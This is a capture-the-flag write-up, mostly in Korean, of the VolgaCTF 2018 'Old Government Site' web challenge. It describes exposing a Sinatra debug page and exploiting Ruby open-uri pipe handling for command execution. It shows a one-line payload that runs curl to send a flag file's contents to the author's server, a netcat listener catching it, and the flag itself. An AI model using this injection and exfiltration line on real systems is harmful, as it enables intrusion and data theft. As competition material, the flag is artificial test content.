# [Web] VolgaCTF - Old Goverment Site

## Description

It's an old government web-site. Please, don't touch it. It works properly.

http://old-government-site.quals.2018.volgactf.ru:8080/



## Analysis

ruby로 구현된 페이지이다. ( ruby on rails, sinatra )

메뉴에 들어가면 /page?id=36과 같은 형태로 페이지를 로드하는 것을 확인할 수 있다.

id를 <u>Array타입</u>으로 페이지를 요청(`/page?id[]=`)하면 에러가 발생하며, 디버그 페이지가 노출된다.

```
/opt/old-government/views/articles.erb in block in singleton class

      </ul>
    </div>
    <br class="clear" />
  </div>
  <!-- ####################################################################################################### -->

       <%=
        case @id.to_i
when 2
  erb :page2
when 5
  erb :page5
when 18
  erb :page18
when 23
```

id의 값을 integer로 캐스팅하여 그에 맞는 페이지를 로드하고, 없을 경우 Page not found가 발생한다.

18번 페이지를 로드하면 Private garbage company 페이지가 나오는데, RCE가 발생하게 생긴 곳이다.

## Exploit

Site에 자신의 서버를 넣으면 응답 값이 날라 온다.

```
$ python -m SimpleHTTPServer 10101
Serving HTTP on 0.0.0.0 port 10101 ...
188.246.233.28 - - [26/Mar/2018 11:02:45] "GET / HTTP/1.1" 200 -
```

Site의 구현이 open_uri의 open으로 구현되있을 거라 예측하였다.

open_uri의 경우 Pipe(|)를 넣어주면 RCE가 가능하다.

> require "open-uri"
>
> open(params[:url]) -> open("|ls") -> 'ls' command execution 

이를 이용해 flag를 얻을 수 있었다.

```
query : |curl [MY SERVER] --data "`cat /*flag*`"

$ nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [188.246.233.28] port 10101 [tcp/*] accepted (family 2, sport 35314)
POST / HTTP/1.1
Host: [MY SERVER]
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

VolgaCTF{dedicated_to_all_goverment_site}
```



**VolgaCTF{dedicated_to_all_goverment_site}**